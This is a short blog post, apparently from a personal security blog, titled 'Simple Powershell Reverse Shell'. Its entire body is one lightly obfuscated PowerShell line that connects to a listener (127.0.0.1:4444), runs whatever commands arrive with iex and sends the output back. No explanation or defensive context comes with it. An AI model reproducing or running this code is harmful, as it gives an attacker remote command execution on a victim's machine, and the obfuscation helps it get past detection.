---
layout: post
title:  "Simple Powershell Reverse Shell"
date:   2019-09-05 00:00:00 -0400
categories: 
---

```
$c=&(GCM *w-O*)Net.Sockets.TCPClient("127.0.0.1",4444);$m=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$m.Read($b,0,$b.Length)) -ne 0){$d = (&(GCM *w-O*) -TypeName Text.ASCIIEncoding).GetString($b,0,$i);$s=(iex $d 2>&1|Out-String);$b=([text.encoding]::ASCII).GetBytes($s);$m.Write($b,0,$b.Length)};
```
